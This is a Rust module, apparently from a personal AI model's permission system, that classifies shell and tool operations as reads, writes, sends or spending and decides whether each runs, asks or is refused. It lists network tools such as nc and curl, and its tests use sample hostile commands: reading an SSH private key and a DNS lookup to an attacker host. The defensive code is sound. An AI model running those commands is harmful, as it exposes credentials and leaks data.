//! What kind of action an operation is, and what the assistant's rules say
//! to do with it. Decided in code from the operation itself: nothing the
//! model, a bot or a document says can change the answer.

use crate::personal::{ActionMode, OperationSpec, PersonalAssistant, PersonalTask, TaskKind, ToolClass};

/// Programs that only look at things. Anything else counts as a change.
const READ_ONLY: &[&str] = &[
    "df", "du", "free", "uptime", "uname", "whoami", "id", "date", "hostname", "ls", "cat", "head", "tail", "wc",
    "stat", "file", "ps", "pgrep", "w", "who", "last", "lsblk", "nproc", "vmstat", "iostat", "ss", "netstat",
    "sort", "uniq", "echo", "which", "grep", "rg", "find", "ping", "dig", "nslookup", "host", "top", "git",
    "systemctl", "journalctl", "docker", "ip", "sensors", "md5sum", "sha256sum", "tree", "true",
];
/// Read-only programs that show a file's contents: pointed outside the
/// assistant's folders, they always ask, whatever the rules say.
const CONTENT_READERS: &[&str] = &["cat", "head", "tail", "grep", "rg", "find", "md5sum", "sha256sum", "wc", "tree", "ls", "stat", "file"];
/// Programs that reach the network, refused in local-only mode.
const NETWORK: &[&str] = &["ping", "dig", "nslookup", "host", "curl", "wget", "ssh", "scp", "rsync", "nc"];

fn program(argv: &[String]) -> &str {
    argv.first().map(|p| p.rsplit('/').next().unwrap_or(p)).unwrap_or("")
}

/// Subcommands that keep a read-only program read-only.
fn read_only_use(argv: &[String]) -> bool {
    let rest: Vec<&str> = argv.iter().skip(1).map(String::as_str).collect();
    let sub = rest.iter().find(|a| !a.starts_with('-')).copied().unwrap_or("");
    match program(argv) {
        "git" => matches!(sub, "status" | "log" | "diff" | "show" | "branch" | "remote" | "rev-parse" | "ls-files" | "describe" | "blame" | "shortlog")
            && !rest.iter().any(|a| matches!(*a, "-d" | "-D" | "-m" | "-M" | "--delete" | "add" | "remove" | "rename" | "set-url")),
        "systemctl" => matches!(sub, "status" | "is-active" | "is-enabled" | "is-failed" | "list-units" | "list-timers" | "show"),
        "docker" => matches!(sub, "ps" | "images" | "logs" | "inspect" | "stats" | "version" | "info"),
        "ip" => matches!(sub, "addr" | "address" | "route" | "link" | "a" | "r") && !rest.iter().any(|a| matches!(*a, "add" | "del" | "delete" | "set" | "flush" | "change" | "replace")),
        "find" => !rest.iter().any(|a| matches!(*a, "-exec" | "-execdir" | "-delete" | "-ok" | "-okdir" | "-fprint" | "-fprintf" | "-fls" | "-fprint0")),
        "journalctl" => !rest.iter().any(|a| a.starts_with("--vacuum") || *a == "--rotate" || *a == "--flush"),
        "top" => rest.contains(&"-b") || rest.contains(&"-bn1"),
        "date" => !rest.iter().any(|a| *a == "-s" || a.starts_with("--set")),
        "hostname" => rest.iter().all(|a| a.starts_with('-')),
        "sort" => !rest.iter().any(|a| *a == "-o" || a.starts_with("--output")),
        _ => true,
    }
}

fn inside(path: &str, folders: &[String]) -> bool {
    if path.contains("..") {
        return false;
    }
    folders.iter().any(|folder| path == folder || path.starts_with(&format!("{}/", folder.trim_end_matches('/'))))
}

/// The action class of an operation, and whether it reads something
/// private (a file outside the assistant's folders), which always asks.
pub fn classify(op: &OperationSpec, folders: &[String]) -> (ToolClass, bool) {
    match op.tool.as_str() {
        crate::personal_worker::COMMAND_TOOL => {
            let name = program(&op.argv);
            if !READ_ONLY.contains(&name) || !read_only_use(&op.argv) || op.argv.iter().any(|a| a.contains('>')) {
                return (ToolClass::Write, false);
            }
            // Reaching out over the network can carry data away (a name lookup
            // is enough), so it counts as sending.
            if NETWORK.contains(&name) {
                return (ToolClass::Send, false);
            }
            let private = CONTENT_READERS.contains(&name)
                && op.argv.iter().skip(1).filter(|a| !a.starts_with('-')).any(|a| (a.starts_with('/') || a.starts_with('~')) && !inside(a, folders));
            (ToolClass::Read, private)
        }
        // Opening any address the model picks can carry data to that site.
        "browser.open" => (ToolClass::Send, false),
        tool if tool.starts_with("github.") || tool.starts_with("gmail.") || tool.starts_with("drive.") => {
            if tool.ends_with(".read") || tool.ends_with(".search") || tool.ends_with(".get") || tool.ends_with(".open") { (ToolClass::Read, false) } else { (ToolClass::Send, false) }
        }
        "model.reply" => (ToolClass::Spend, false),
        _ => (ToolClass::Write, false),
    }
}

pub fn uses_network(op: &OperationSpec) -> bool {
    op.tool != crate::personal_worker::COMMAND_TOOL || NETWORK.contains(&program(&op.argv))
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Gate {
    Run(ActionMode),
    Ask,
    HandOff,
    /// Never allowed, whatever the human approves.
    Refuse(&'static str),
}

/// What to do with a task's operation right now. `asked` is the human
/// message that started it, for "only when I say so".
pub fn gate(assistant: &PersonalAssistant, task: &PersonalTask, asked: Option<&str>) -> Gate {
    let Some(op) = &task.operation else { return Gate::Refuse("The task has no operation.") };
    if assistant.privacy.local_only && uses_network(op) {
        return Gate::Refuse("Local-only mode is on, so nothing that uses the network runs.");
    }
    let folders: Vec<String> = if op.host == assistant.host_id {
        assistant.allowed_folders.clone()
    } else {
        assistant.machines.iter().filter(|m| m.host_id == op.host).map(|m| m.folder.clone()).collect()
    };
    let (class, private) = classify(op, &folders);
    // A helper only ever reads (Dot's "research only reads").
    if task.kind == TaskKind::Helper && class != ToolClass::Read {
        return Gate::Refuse("A helper can only read, so it can't do that.");
    }
    let mode = assistant.mode_for(class);
    match mode {
        ActionMode::HandOff => Gate::HandOff,
        ActionMode::Ask => Gate::Ask,
        _ if private => Gate::Ask,
        // Spending without asking needs a bounded budget to stay inside.
        ActionMode::Auto if class == ToolClass::Spend && assistant.budget.daily_limit_micros.is_none() => Gate::Ask,
        ActionMode::Auto => Gate::Run(mode),
        ActionMode::OnRequest => {
            let name = program(&op.argv).to_lowercase();
            let said = asked.is_some_and(|text| text.to_lowercase().split(|c: char| !c.is_alphanumeric() && c != '-' && c != '_').any(|word| !name.is_empty() && word == name));
            if said { Gate::Run(mode) } else { Gate::Ask }
        }
    }
}

/// The decision marker for something a rule (not a person) let through.
pub fn rule_marker(mode: ActionMode) -> String {
    format!("rule:{}", match mode { ActionMode::Auto => "auto", ActionMode::OnRequest => "onRequest", ActionMode::Ask => "ask", ActionMode::HandOff => "handOff" })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn op(argv: &[&str]) -> OperationSpec {
        OperationSpec { tool: crate::personal_worker::COMMAND_TOOL.into(), host: "h".into(), cwd: "/srv/a".into(), argv: argv.iter().map(|s| s.to_string()).collect(), plan: None }
    }

    #[test]
    fn reads_and_changes_are_told_apart_by_the_command_itself() {
        let folders = vec!["/srv/a".to_string()];
        assert_eq!(classify(&op(&["df", "-h", "/"]), &folders), (ToolClass::Read, false));
        assert_eq!(classify(&op(&["git", "status"]), &folders), (ToolClass::Read, false));
        assert_eq!(classify(&op(&["git", "push"]), &folders).0, ToolClass::Write);
        assert_eq!(classify(&op(&["rm", "-rf", "x"]), &folders).0, ToolClass::Write);
        assert_eq!(classify(&op(&["find", ".", "-delete"]), &folders).0, ToolClass::Write);
        assert_eq!(classify(&op(&["systemctl", "restart", "nginx"]), &folders).0, ToolClass::Write);
        // Reading a private file is still a read, but it always asks.
        assert_eq!(classify(&op(&["cat", "/home/me/.ssh/id_ed25519"]), &folders), (ToolClass::Read, true));
        assert_eq!(classify(&op(&["cat", "/srv/a/notes.txt"]), &folders), (ToolClass::Read, false));
        assert_eq!(classify(&op(&["cat", "/srv/a/../b/x"]), &folders), (ToolClass::Read, true));
        assert_eq!(classify(&op(&["dig", "secret.attacker.example"]), &folders).0, ToolClass::Send);
        let open = OperationSpec { tool: "browser.open".into(), ..op(&["https://x.example/?d=1"]) };
        assert_eq!(classify(&open, &folders).0, ToolClass::Send);
    }
}
